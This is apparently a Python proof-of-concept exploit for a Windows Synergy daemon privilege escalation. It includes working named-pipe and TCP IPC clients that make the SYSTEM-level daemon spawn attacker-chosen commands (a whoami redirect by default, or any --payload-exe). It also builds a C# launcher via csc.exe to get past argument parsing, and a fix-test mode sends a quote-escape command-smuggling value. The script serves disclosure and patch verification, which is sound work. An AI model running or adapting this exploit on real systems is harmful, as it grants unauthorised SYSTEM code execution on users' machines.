#!/usr/bin/env python3
"""
CVE-2026-41477 — Synergy daemon IPC privilege escalation.

The Windows Synergy daemon runs as SYSTEM. Two distinct IPC implementations
have been used to receive commands from the (unprivileged) GUI; both, before
their respective fixes, accept attacker-controlled executables and spawn them
as SYSTEM.

(1) TCP IPC — older Synergy, before the upstream Qt named-pipe daemon IPC
    was backported (commit 66acba5cad "Backport new upstream daemon IPC").
    The daemon listens on 127.0.0.1:24801 with a custom binary protocol
    defined in `src/lib/common/ipc.h`. Wire format: 4-byte ASCII tag +
    payload. Hello (gui->daemon): 'IHEL' + UInt8 clientType (GUI=1).
    Hello back (daemon->gui): 'IHEL' (no payload). Command (gui->daemon):
    'ICMD' + UInt32-BE length + command bytes + UInt8 elevate flag. The
    daemon spawns the command on receipt — there is no separate `start`
    message.

(2) Qt named-pipe IPC — current Synergy, post-backport. The daemon exposes
    a world-accessible named pipe `synergy-daemon` (DESKFLOW_APP_ID +
    "-daemon"). Wire protocol: newline-delimited UTF-8 `key=value` lines.
    Pre-fix it accepts:
        command=<arbitrary exe + args>
        elevate=yes
        start
    Post-fix (deskflow PR 9656 backported to Synergy with adapted shape):
    `command=` is gone. The GUI now sends `mode=server|client`, `args=...`,
    `elevate=yes|no`, then `start`. The daemon constructs the executable
    path itself from `applicationDirPath() + SERVER_BINARY_NAME` (or
    CLIENT), so the IPC sender can no longer choose what to spawn. This
    PoC's `fix-test` mode probes for that shape; it only applies to the
    named-pipe IPC.

Modes:

    --mode exploit
        Reproduces the privesc end-to-end. Drops a `whoami` redirect via
        cmd.exe and verifies the resulting file appears at the expected
        path (created by SYSTEM, owned by the daemon process tree).

    --mode fix-test
        Named-pipe only. Probes for the deskflow PR 9656 fix shape:
        legacy `command=` rejected, `configFile=` UNC paths rejected
        before existence check, no shell-style smuggling via `configFile=`.

    --mode auto (default)
        Pipe transport: pre-fix -> exploit, post-fix -> fix-test.
        TCP transport: always exploit (no fix concept on the legacy IPC).

Transports:

    --transport pipe  -> Qt named-pipe IPC only (newer daemon)
    --transport tcp   -> legacy TCP IPC only (older daemon)
    --transport auto  -> probes both; uses whichever the daemon exposes.
"""

import argparse
import os
import socket
import struct
import sys
import tempfile
import time

PIPE_NAME = "synergy-daemon"
TCP_HOST = "127.0.0.1"
TCP_PORT = 24801
TCP_CLIENT_TYPE_GUI = 1  # IpcClientType::GUI from src/lib/common/ipc.h

if os.name == "nt":
    import ctypes
    import ctypes.wintypes as wt
    import msvcrt

    _kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    _PeekNamedPipe = _kernel32.PeekNamedPipe
    _PeekNamedPipe.argtypes = [
        wt.HANDLE, ctypes.c_void_p, wt.DWORD,
        ctypes.POINTER(wt.DWORD), ctypes.POINTER(wt.DWORD), ctypes.POINTER(wt.DWORD),
    ]
    _PeekNamedPipe.restype = wt.BOOL

    def _pipe_bytes_available(handle):
        avail = wt.DWORD(0)
        ok = _PeekNamedPipe(handle, None, 0, None, ctypes.byref(avail), None)
        return int(avail.value) if ok else -1

    def _enable_vt():
        # Legacy cmd.exe won't interpret ANSI unless VT processing is on.
        # Windows Terminal / VS Code already handle it, so this is a no-op there.
        try:
            h = _kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
            mode = wt.DWORD()
            if _kernel32.GetConsoleMode(h, ctypes.byref(mode)):
                _kernel32.SetConsoleMode(h, mode.value | 0x0004)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        except OSError:
            pass
else:
    def _enable_vt():
        pass


_GREEN, _RED, _YELLOW, _GRAY, _RESET = "\033[32m", "\033[31m", "\033[33m", "\033[90m", "\033[0m"
_PASS = f"{_GREEN}[PASS]{_RESET}"
_FAIL = f"{_RED}[FAIL]{_RESET}"
_CHECK = f"{_YELLOW}[CHECK LOG]{_RESET}"
_NA = f"{_GRAY}[N/A]{_RESET}"


def _verdict(ok, msg):
    """ok=True -> green PASS, ok=False -> red FAIL, ok=None -> yellow CHECK LOG."""
    marker = _PASS if ok is True else _FAIL if ok is False else _CHECK
    print(f"         {marker} {msg}")


def _verdict_na(msg):
    print(f"         {_NA} {msg}")


def _wait_for_file(path, timeout=6.0, interval=0.2):
    """Poll for path to exist; return True as soon as it does.

    Needed because the daemon's watchdog may be in backoff from prior failures
    and won't spawn the command for a second or two. A single sleep(1.5) can
    race and miss the spawn, giving a false PASS on case A.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if os.path.exists(path):
            return True
        time.sleep(interval)
    return False


_REJECT_WORDS = ("unknown command", "unknown message", "does not exist", "invalid", "error")


def _log_size(path):
    if not path:
        return 0
    try:
        return os.path.getsize(path)
    except OSError:
        return 0


def _log_tail(path, start):
    if not path:
        return ""
    try:
        with open(path, "rb") as f:
            f.seek(start)
            return f.read().decode("utf-8", errors="replace")
    except OSError:
        return ""


def _print_tail(tail, max_lines=6):
    lines = [ln for ln in tail.splitlines() if ln.strip()]
    for ln in lines[-max_lines:]:
        print(f"         > {ln}")


def _rejected(tail):
    low = tail.lower()
    return any(w in low for w in _REJECT_WORDS)


def _post_case_log(log_path, pre_size, expect_reject=True, flush_delay=0.25, na=False):
    """Read the log tail since pre_size, print it, and emit a verdict.

    If na=True, emit [N/A] (case not applicable to the detected daemon branch).
    If expect_reject=True, rejection keywords in the tail → PASS.
    If expect_reject=False, absence of rejection keywords → PASS.
    """
    time.sleep(flush_delay)
    tail = _log_tail(log_path, pre_size)
    _print_tail(tail)
    if na:
        _verdict_na("fix-branch case; not applicable on pre-fix daemon.")
        return
    if not log_path:
        _verdict(None, "no log path; cannot verify from daemon log.")
        return
    rejected = _rejected(tail)
    if expect_reject:
        _verdict(rejected, "log shows rejection." if rejected else "no rejection keywords in log tail.")
    else:
        _verdict(not rejected, "no rejection keywords — accepted as expected." if not rejected else "unexpected rejection keywords.")


# ===========================================================================
# Pipe transport (newer Synergy: Qt named-pipe IPC, newline `key=value`)
# ===========================================================================

class PipeIpcClient:
    """Line-oriented client for Qt's QLocalServer.

    On Windows the server is a named pipe; on Linux/macOS it's AF_UNIX. The
    wire protocol is newline-delimited UTF-8 `command=arg1=arg2=...` lines.

    Reads poll with a short interval so Ctrl+C is responsive even when the
    server never replies (as with unknown commands)."""

    def __init__(self, timeout=3.0):
        self._timeout = timeout
        if os.name == "nt":
            self._f = open(r"\\.\pipe\{}".format(PIPE_NAME), "r+b", buffering=0)
            self._sock = None
        else:
            runtime = os.environ.get("XDG_RUNTIME_DIR", "/tmp")
            self._sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self._sock.settimeout(timeout)
            self._sock.connect(os.path.join(runtime, PIPE_NAME))
            self._f = None

    def send(self, message):
        data = (message + "\n").encode("utf-8")
        if self._f:
            self._f.write(data)
            self._f.flush()
        else:
            self._sock.sendall(data)

    def recv_line(self, timeout=None):
        """Read one \\n-terminated line, or return '' on timeout.

        Polls in small ticks so KeyboardInterrupt is honoured promptly even
        on Windows (where a bare pipe read() is non-interruptible)."""
        if timeout is None:
            timeout = self._timeout
        deadline = time.monotonic() + timeout

        if self._f:
            h = msvcrt.get_osfhandle(self._f.fileno())
            buf = bytearray()
            while time.monotonic() < deadline:
                avail = _pipe_bytes_available(h)
                if avail > 0:
                    chunk = self._f.read(min(avail, 4096))
                    if not chunk:
                        break
                    buf.extend(chunk)
                    if b"\n" in buf:
                        line, _, _ = buf.partition(b"\n")
                        return line.decode("utf-8", errors="replace")
                else:
                    time.sleep(0.05)
            return bytes(buf).decode("utf-8", errors="replace").rstrip("\n")

        self._sock.settimeout(timeout)
        buf = b""
        try:
            while not buf.endswith(b"\n"):
                chunk = self._sock.recv(1)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf.decode("utf-8", errors="replace").rstrip("\n")

    def close(self):
        try:
            if self._f:
                self._f.close()
            if self._sock:
                self._sock.close()
        except OSError:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


def pipe_connect_and_handshake():
    """Open a fresh pipe IPC connection and complete the trivial hello handshake.

    Synergy's daemon replies "hello\\n" to any "hello..." message — there is
    no version negotiation, unlike the upstream Deskflow fix branch.
    """
    c = PipeIpcClient()
    c.send("hello")
    reply = c.recv_line(timeout=2.0)
    if "hello" not in (reply or "").lower():
        c.close()
        raise RuntimeError(f"handshake failed: {reply!r}")
    return c


def pipe_send_and_print(client, message, label, read_timeout=0.75):
    print(f"    >> {label}: {message!r}")
    client.send(message)
    reply = client.recv_line(timeout=read_timeout)
    print(f"    << {reply!r}" if reply else "    << <no reply>")
    return reply


def pipe_detect_branch():
    """Return 'post-fix' if `mode=` is wired up, 'pre-fix' otherwise.

    Probe: send `mode=` (empty value). On a fix branch this hits the
    "invalid mode value" check in processMode and replies 'error'. On
    pre-fix Synergy there is no `mode` handler — the daemon logs
    'unknown message' and sends no reply.
    """
    try:
        with pipe_connect_and_handshake() as c:
            c.send("mode=")
            reply = c.recv_line(timeout=1.0)
    except Exception:  # noqa: BLE001
        return None
    return "post-fix" if "error" in (reply or "").lower() else "pre-fix"


def pipe_query_log_path():
    try:
        with pipe_connect_and_handshake() as c:
            c.send("logPath")
            reply = c.recv_line(timeout=1.0)
    except Exception:  # noqa: BLE001
        return None
    if reply.startswith("logPath="):
        return reply.split("=", 1)[1].strip() or None
    return None


_CSHARP_LAUNCHER_SRC = r"""
using System;
using System.Diagnostics;
using System.IO;

class Launcher {
    static int Main(string[] args) {
        // Trailing positional from parseClientArgs is the evidence path.
        // Everything else (e.g. `--debug DEBUG`) is ignored.
        if (args.Length == 0) return 1;
        string evidence = args[args.Length - 1];
        var psi = new ProcessStartInfo("cmd.exe", "/c whoami /all") {
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true,
        };
        using (var p = Process.Start(psi)) {
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            File.WriteAllText(evidence, output);
        }
        return 0;
    }
}
"""


def _find_csc():
    """Locate csc.exe from .NET Framework. 64-bit preferred for parity with daemon."""
    candidates = [
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe",
    ]
    for path in candidates:
        if os.path.exists(path):
            return path
    return None


def _build_csharp_launcher():
    """JIT-compile a tiny .NET launcher and return its path (or None on failure).

    The launcher exists to dodge the parseClientArgs/parseGenericArgs paradox:
    the daemon's parser only accepts a *trailing* unrecognized positional, and
    `--debug LEVEL` must reach parseGenericArgs to populate m_logFilter (else
    the IPC handler AVs on `String logLevel(nullptr)`). No built-in Windows
    binary tolerates `--debug DEBUG` ahead of its real arguments — wscript and
    cscript treat the first non-`//` token as the script path, cmd refuses to
    honour `/C` after non-switch garbage, powershell rejects unknown flags.
    A tiny .NET stub ignores leading junk and consumes the trailing positional.
    """
    import subprocess
    csc = _find_csc()
    if csc is None:
        return None
    src_path = os.path.join(tempfile.gettempdir(), f"synergy_pwner_{os.getpid()}.cs")
    exe_path = os.path.join(tempfile.gettempdir(), f"synergy_pwner_{os.getpid()}.exe")
    with open(src_path, "w", encoding="ascii") as f:
        f.write(_CSHARP_LAUNCHER_SRC)
    try:
        result = subprocess.run(
            [csc, "/nologo", "/target:exe", f"/out:{exe_path}", src_path],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode != 0:
            print(f"[!] csc.exe failed (rc={result.returncode}):")
            print(result.stdout)
            print(result.stderr)
            return None
    finally:
        try:
            os.remove(src_path)
        except OSError:
            pass
    return exe_path if os.path.exists(exe_path) else None


# ===========================================================================
# TCP transport (older Synergy: pre-named-pipe-backport, custom binary IPC)
# ===========================================================================
#
# Wire format (from src/lib/common/ipc.h and src/lib/ipc/IpcClientProxy.cpp):
#
#   gui  -> daemon  IHEL  + UInt8 clientType         (kIpcMsgHello)
#   daemon -> gui   IHEL                             (kIpcMsgHelloBack, no payload)
#   gui  -> daemon  ICMD  + %s + UInt8 elevate       (kIpcMsgCommand)
#
# %s here is ProtocolUtil's length-prefixed string: UInt32 big-endian length
# followed by raw bytes. The daemon spawns the command on receipt of ICMD —
# there is no separate `start` like in the newer IPC. There is also no `stop`
# or `clear` from the GUI side; the only attacker-relevant message is ICMD.

class TcpIpcClient:
    def __init__(self, timeout=3.0):
        self._timeout = timeout
        self._sock = socket.create_connection((TCP_HOST, TCP_PORT), timeout=timeout)
        self._sock.settimeout(timeout)

    def _recv_exact(self, n, timeout=None):
        """Read exactly n bytes or raise TimeoutError."""
        self._sock.settimeout(timeout if timeout is not None else self._timeout)
        buf = bytearray()
        while len(buf) < n:
            chunk = self._sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("daemon closed connection during read")
            buf.extend(chunk)
        return bytes(buf)

    def send_hello(self):
        # IHEL + UInt8 clientType. We claim to be GUI (1).
        self._sock.sendall(b"IHEL" + bytes([TCP_CLIENT_TYPE_GUI]))

    def expect_hello_back(self, timeout=2.0):
        # IpcLogOutputter runs on its own thread and starts flushing buffered
        # log lines (ILOG) the moment a GUI connects, so ILOG can beat IHEL
        # to the wire. Skip ILOG frames until we see the actual hello back.
        deadline = time.monotonic() + timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError("timed out waiting for IHEL hello-back")
            tag = self._recv_exact(4, timeout=remaining)
            if tag == b"IHEL":
                return
            if tag == b"ILOG":
                # %s is UInt32-BE length + bytes.
                length = int.from_bytes(self._recv_exact(4, timeout=remaining), "big")
                if length:
                    self._recv_exact(length, timeout=remaining)
                continue
            raise RuntimeError(f"unexpected handshake tag: {tag!r}")

    def send_command(self, command, elevate):
        # ICMD + UInt32-BE-len + bytes + UInt8 elevate flag.
        cmd_bytes = command.encode("utf-8")
        msg = b"ICMD" + struct.pack(">I", len(cmd_bytes)) + cmd_bytes + bytes([1 if elevate else 0])
        self._sock.sendall(msg)

    def close(self):
        try:
            self._sock.close()
        except OSError:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


def tcp_connect_and_handshake():
    """Open a TCP connection and complete IHEL handshake."""
    c = TcpIpcClient()
    c.send_hello()
    c.expect_hello_back()
    return c


# ===========================================================================
# Transport probing & selection
# ===========================================================================

def probe_pipe(timeout=1.0):
    """Return True if the named pipe is connectable and answers `hello`."""
    try:
        c = PipeIpcClient(timeout=timeout)
    except OSError:
        return False
    try:
        c.send("hello")
        return "hello" in (c.recv_line(timeout=timeout) or "").lower()
    except Exception:  # noqa: BLE001
        return False
    finally:
        c.close()


def probe_tcp(timeout=1.0):
    """Return True if 127.0.0.1:24801 is connectable and completes IHEL handshake."""
    try:
        c = TcpIpcClient(timeout=timeout)
    except OSError:
        return False
    try:
        c.send_hello()
        c.expect_hello_back(timeout=timeout)
        return True
    except Exception:  # noqa: BLE001
        return False
    finally:
        c.close()


def detect_transport():
    """Probe both transports; return 'pipe', 'tcp', or None.

    Pipe is probed first because it's the active path on current daemons.
    A daemon serving both is theoretically possible but unseen in practice;
    pipe wins the tiebreak (fix-test mode is more useful than exploit-only).
    """
    if probe_pipe():
        return "pipe"
    if probe_tcp():
        return "tcp"
    return None


# ===========================================================================
# Mode: exploit (pipe transport)
# ===========================================================================

def mode_exploit_pipe(payload_exe, evidence_path):
    """Reproduce the pre-fix vulnerability end-to-end via the named-pipe IPC."""
    print("=" * 70)
    print("MODE: exploit (pipe)  —  targets the pre-fix Synergy daemon (Qt IPC)")
    print("=" * 70)
    print(f"Payload: {payload_exe}")
    print("Expected on pre-fix:  FAIL — daemon spawns payload as SYSTEM.")
    print("Expected on post-fix: PASS — legacy `command=` is unknown, nothing spawned.\n")

    log_path = pipe_query_log_path()
    if log_path:
        print(f"[*] Daemon log: {log_path}")

    if evidence_path:
        try:
            os.remove(evidence_path)
        except OSError:
            pass

    pre = _log_size(log_path)
    with pipe_connect_and_handshake() as c:
        pipe_send_and_print(c, f"command={payload_exe}", "inject command")
        pipe_send_and_print(c, "elevate=yes", "request elevation")
        pipe_send_and_print(c, "start", "start watchdog")

    if evidence_path is None:
        _print_tail(_log_tail(log_path, pre))
        _verdict(None, "custom --payload-exe supplied; cannot auto-verify. Inspect log/system state.")
        return

    # See case A in mode_fix_test: watchdog backoff can delay the spawn, so poll.
    _wait_for_file(evidence_path, timeout=15.0)
    _print_tail(_log_tail(log_path, pre))

    if os.path.exists(evidence_path):
        _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
        try:
            with open(evidence_path, encoding="utf-8", errors="replace") as f:
                for line in f.read().splitlines()[:12]:
                    print(f"         | {line}")
        except OSError as e:
            print(f"         !! read failed: {e}")
        try:
            os.remove(evidence_path)
        except OSError:
            pass
    elif pipe_detect_branch() == "pre-fix":
        _verdict(None, "no evidence file within 15s but daemon is pre-fix — likely in watchdog backoff. Re-run.")
    else:
        _verdict(True, "no evidence file — legacy `command=` was rejected.")


# ===========================================================================
# Mode: exploit (tcp transport)
# ===========================================================================

def mode_exploit_tcp(payload_exe, evidence_path):
    """Reproduce the pre-named-pipe-backport vulnerability via the legacy TCP IPC."""
    print("=" * 70)
    print("MODE: exploit (tcp)  —  targets pre-backport Synergy daemon (legacy IPC)")
    print("=" * 70)

    payload_path = None
    if payload_exe is None and evidence_path is not None:
        # Two daemon-side gates the payload has to clear simultaneously:
        #
        # (a) ArgsBase::m_logFilter must be non-null before
        #     DaemonApp::handleIpcMessage runs `String logLevel(m_logFilter)`
        #     — std::string(nullptr) UBs through strlen(NULL) and AVs the
        #     IPC handler thread before the spawn can fire. Setting
        #     m_logFilter requires `--debug LEVEL` to be parsed by
        #     parseGenericArgs, which only happens when parseClientArgs
        #     reaches that token (i.e. all preceding tokens parse cleanly).
        #
        # (b) parseClientArgs's positional handling: only the *last*
        #     unrecognized token is accepted as the server-address
        #     positional (`if (i + 1 == argc) m_serverAddress = argv[i]`);
        #     any earlier unrecognized token returns false at CLOG_CRIT.
        #     CLOG_CRIT is just a log level, not a hard exit, but if the
        #     parser bails at argv[1] it never reaches `--debug` and (a)
        #     fails. So the only command shape that satisfies both is
        #     `<binary> --debug DEBUG <trailing positional>`.
        #
        # Built-in spawn targets fight that shape: wscript/cscript treat
        # the first non-`//` token as the script path; cmd needs `/C` to
        # come ahead of any non-switch garbage; powershell rejects
        # unrecognized leading flags. So we emit a tiny .NET launcher
        # whose `Main` ignores the leading flags and treats the trailing
        # positional as a path to write `whoami` output to. csc.exe ships
        # with .NET Framework on every modern Windows install.
        payload_path = _build_csharp_launcher()
        if payload_path is None:
            print("[!] Could not build C# launcher (csc.exe not found?). Aborting tcp exploit.")
            return
        quoted_launcher = f'"{payload_path}"' if " " in payload_path else payload_path
        quoted_evidence = f'"{evidence_path}"' if " " in evidence_path else evidence_path
        payload_exe = f"{quoted_launcher} --debug DEBUG {quoted_evidence}"

    print(f"Payload: {payload_exe}")
    print("Expected: FAIL — daemon spawns payload as SYSTEM on receipt of ICMD.")
    print("(There is no fix-test for this transport; the fix is the named-pipe rewrite itself.)\n")

    if evidence_path:
        try:
            os.remove(evidence_path)
        except OSError:
            pass

    print("[*] TCP target: %s:%d" % (TCP_HOST, TCP_PORT))
    try:
        with tcp_connect_and_handshake() as c:
            print(f"    >> ICMD command={payload_exe!r} elevate=1")
            c.send_command(payload_exe, elevate=True)
            time.sleep(0.5)

        if evidence_path is None:
            _verdict(None, "custom --payload-exe supplied; cannot auto-verify. Inspect log/system state.")
            return

        _wait_for_file(evidence_path, timeout=15.0)

        if os.path.exists(evidence_path):
            _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
            try:
                with open(evidence_path, encoding="utf-8", errors="replace") as f:
                    for line in f.read().splitlines()[:12]:
                        print(f"         | {line}")
            except OSError as e:
                print(f"         !! read failed: {e}")
            try:
                os.remove(evidence_path)
            except OSError:
                pass
        else:
            _verdict(None, "no evidence file within 15s — daemon may be in backoff or the command path failed silently. Re-run.")
    finally:
        if payload_path:
            try:
                os.remove(payload_path)
            except OSError:
                pass


# ===========================================================================
# Mode: fix-test (pipe only)
# ===========================================================================

def _fix_case(title, messages, expectation):
    print(f"\n  [case] {title}")
    print(f"         expected: {expectation}")
    replies = []
    try:
        with pipe_connect_and_handshake() as c:
            for label, msg in messages:
                replies.append(pipe_send_and_print(c, msg, label))
    except Exception as e:  # noqa: BLE001
        print(f"         !! aborted: {e}")
        return None
    return replies


def mode_fix_test():
    """Probe the new mode=/args=/elevate= IPC for residual attack surface."""
    print("=" * 70)
    print("MODE: fix-test  —  probes the new mode=/args=/elevate= IPC")
    print("=" * 70)
    print("Each case should be rejected or have no privileged effect.\n")

    log_path = pipe_query_log_path()
    if log_path:
        print(f"[*] Daemon log: {log_path}")
    else:
        print("[!] Could not query daemon logPath; per-case checks will show [CHECK LOG].")

    branch = pipe_detect_branch()
    pre_fix = branch == "pre-fix"
    if pre_fix:
        print("[!] Pre-fix daemon detected — `mode=` is not wired up here.")
        print("    Case A probes this daemon directly; case B will be marked [N/A].\n")
    elif branch == "post-fix":
        print("[*] Post-fix daemon detected — `mode=`/`args=` are handled.\n")
    else:
        print("[!] Could not probe daemon; running battery anyway.\n")

    # Case A: legacy `command=` is the privesc primitive. Post-fix it must be
    # gone — no `processCommand` handler, no auto-spawn. We probe by sending a
    # cmd.exe payload and verifying the evidence file never appears.
    evidence_path = rf"C:\Windows\Temp\synergy_elev_check_{os.getpid()}.txt"
    try:
        os.remove(evidence_path)
    except OSError:
        pass

    pre = _log_size(log_path)
    _fix_case(
        "A. legacy `command=` should no longer exist",
        [
            ("elevation check", rf'command=C:\Windows\System32\cmd.exe /c whoami /all > "{evidence_path}"'),
            ("legacy elevate", "elevate=yes"),
            ("start", "start"),
        ],
        "server logs 'unknown message'; no process spawned; no evidence file.",
    )
    # Poll (up to 15s) because the watchdog may be in start-failure backoff from
    # prior runs: a previous spawn can sit in the kill-timeout (10s) before the
    # next retry even fires. A short sleep here races the retry and misses the
    # spawn entirely.
    _wait_for_file(evidence_path, timeout=15.0)
    _print_tail(_log_tail(log_path, pre))
    if os.path.exists(evidence_path):
        _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
        try:
            with open(evidence_path, encoding="utf-8", errors="replace") as f:
                for line in f.read().splitlines()[:12]:
                    print(f"         | {line}")
        except OSError as e:
            print(f"         !! read failed: {e}")
        try:
            os.remove(evidence_path)
        except OSError:
            pass
    elif pre_fix:
        # On pre-fix, `command=` is still a known handler and the watchdog did
        # try to spawn. Missing evidence file here means our poll window raced
        # the backoff, not that the daemon rejected anything.
        _verdict(None, "command= was accepted but no evidence file within 15s — daemon likely in backoff. Re-run.")
    else:
        _verdict(True, "no evidence file — legacy `command=` was rejected.")

    # Case B: shell-style command smuggle via `args=`. The daemon builds
    # `"<trusted-bin>" <args>` and hands the lot to CreateProcess. CreateProcess
    # doesn't shell-interpret, so `&`/`;`/`>`/backticks are literal. We try
    # three smuggle shapes:
    #   - shell-metas (`& cmd /c ...`) that would chain on a shell
    #   - quote escape (`"`) that would close the binPath quoting and let
    #     attacker tokens become argv[0]
    #   - bare second .exe path that would be executed if anything in the
    #     chain re-parses args as a command line
    # The trusted server/client binary will refuse the weird args and exit;
    # the evidence file should never appear.
    smuggle_ev = rf"C:\Windows\Temp\synergy_args_smuggle_{os.getpid()}.txt"
    try:
        os.remove(smuggle_ev)
    except OSError:
        pass

    smuggle_args = (
        rf'foo" & C:\Windows\System32\cmd.exe /c whoami /all > "{smuggle_ev}'
    )

    pre = _log_size(log_path)
    _fix_case(
        "B. shell-style command smuggle via `args=`",
        [
            ("mode", "mode=server"),
            ("args-smuggle", f"args={smuggle_args}"),
            ("elevate", "elevate=yes"),
            ("start", "start"),
        ],
        "no evidence file appears (CreateProcess does not shell-interpret args).",
    )
    _wait_for_file(smuggle_ev, timeout=10.0)
    _print_tail(_log_tail(log_path, pre))
    if os.path.exists(smuggle_ev):
        _verdict(False, f"smuggle confirmed — evidence file created: {smuggle_ev}")
        try:
            with open(smuggle_ev, encoding="utf-8", errors="replace") as f:
                for line in f.read().splitlines()[:12]:
                    print(f"         | {line}")
        except OSError as e:
            print(f"         !! read failed: {e}")
        try:
            os.remove(smuggle_ev)
        except OSError:
            pass
    elif pre_fix:
        _verdict_na("fix-branch case; mode=/args= not handled on pre-fix daemon.")
    else:
        _verdict(True, "no evidence file — args not shell-interpreted, smuggle blocked.")


# ===========================================================================

def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--mode", choices=("auto", "exploit", "fix-test"), default="auto")
    ap.add_argument("--transport", choices=("auto", "pipe", "tcp"), default="auto",
                    help="Which IPC transport to target. 'pipe' = newer Qt named-pipe IPC, "
                         "'tcp' = legacy 127.0.0.1:24801 IPC, 'auto' = probe both.")
    ap.add_argument(
        "--payload-exe",
        default=None,
        help="Command used in --mode=exploit. Defaults to a `whoami` redirect "
             "whose output path is auto-verified.",
    )
    args = ap.parse_args()
    _enable_vt()

    transport = args.transport
    if transport == "auto":
        transport = detect_transport()
        if transport is None:
            print(f"[!] No daemon detected on pipe '{PIPE_NAME}' or tcp {TCP_HOST}:{TCP_PORT}.")
            print("    Is the Synergy daemon running?")
            return 2
        print(f"[*] Auto-detected transport: {transport}")

    if transport == "pipe":
        print(f"[*] Target pipe: {PIPE_NAME}")
        # Probe handshake to confirm reachability and surface error early.
        try:
            with pipe_connect_and_handshake():
                pass
        except Exception as e:  # noqa: BLE001
            print(f"[!] Could not handshake with daemon ({e}) — is it running?")
            return 2
        print("[*] Pipe handshake OK\n")
    else:  # tcp
        print(f"[*] Target tcp: {TCP_HOST}:{TCP_PORT}")
        try:
            with tcp_connect_and_handshake():
                pass
        except Exception as e:  # noqa: BLE001
            print(f"[!] Could not handshake with daemon ({e}) — is it running?")
            return 2
        print("[*] TCP handshake OK\n")

    mode = args.mode
    if mode == "auto":
        if transport == "tcp":
            # The legacy IPC has no fix concept; only exploit makes sense.
            mode = "exploit"
            print("[*] TCP transport: defaulting to --mode exploit (no fix-test on legacy IPC)\n")
        else:
            branch = pipe_detect_branch()
            if branch == "pre-fix":
                mode = "exploit"
            elif branch == "post-fix":
                mode = "fix-test"
            else:
                print("[!] Could not detect daemon branch — pass --mode exploit or --mode fix-test explicitly.")
                return 2
            print(f"[*] Auto-detected daemon branch: {branch} — running --mode {mode}\n")

    if mode == "fix-test" and transport == "tcp":
        print("[!] --mode fix-test only applies to the pipe transport. The legacy IPC has no fix to test.")
        return 2

    if mode == "exploit":
        if args.payload_exe:
            payload_exe, evidence_path = args.payload_exe, None
        else:
            evidence_path = rf"C:\Windows\Temp\synergy_privesc_{os.getpid()}.txt"
            if transport == "pipe":
                payload_exe = rf'C:\Windows\System32\cmd.exe /c whoami > "{evidence_path}"'
            else:
                # mode_exploit_tcp builds a .bat to bypass the legacy daemon's argparser.
                payload_exe = None
        if transport == "pipe":
            mode_exploit_pipe(payload_exe, evidence_path)
        else:
            mode_exploit_tcp(payload_exe, evidence_path)
    elif mode == "fix-test":
        mode_fix_test()

    # Signing off — leaves a harmless calling card on the pipe transport.
    # The TCP transport rejects unknown 4-byte tags by closing the connection,
    # which is noisier in the log than we want for a benign signoff, so skip.
    if transport == "pipe":
        try:
            with pipe_connect_and_handshake() as c:
                c.send("meow")
        except Exception:  # noqa: BLE001
            pass

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(130)
